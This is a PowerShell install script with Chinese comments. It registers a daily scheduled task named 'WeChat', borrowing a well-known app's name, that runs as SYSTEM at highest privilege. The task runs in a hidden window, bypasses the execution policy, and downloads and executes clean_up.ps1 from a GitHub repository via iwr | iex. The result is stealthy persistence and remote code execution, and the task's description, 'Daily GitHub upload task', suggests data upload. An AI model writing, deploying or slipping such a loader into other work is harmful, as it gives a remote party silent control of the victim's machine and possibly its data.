# install.ps1 — 安装一次即完成部署

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# 注册计划任务 “WeChat”，每天 1 点执行下方命令
$taskName = "WeChat"
$taskDesc = "Daily GitHub upload task"
$scriptUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/clean_up.ps1"

# 如果已有同名任务，先删除
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# 构造要在触发时执行的 PowerShell 命令行：
#   拉取最新 clean_up.ps1 并交给 iex（Invoke-Expression）执行
$psCmd = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iwr '$scriptUrl' -UseBasicParsing | iex`""

$action    = New-ScheduledTaskAction   -Execute "powershell.exe" -Argument $psCmd
$trigger   = New-ScheduledTaskTrigger  -Daily -At 1:00am
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -Action $action `
    -Trigger $trigger `
    -TaskName $taskName `
    -Description $taskDesc `
    -Principal $principal

Write-Host "✅ Task '$taskName' installed. It will pull & run clean_up.ps1 daily at 1:00 AM."
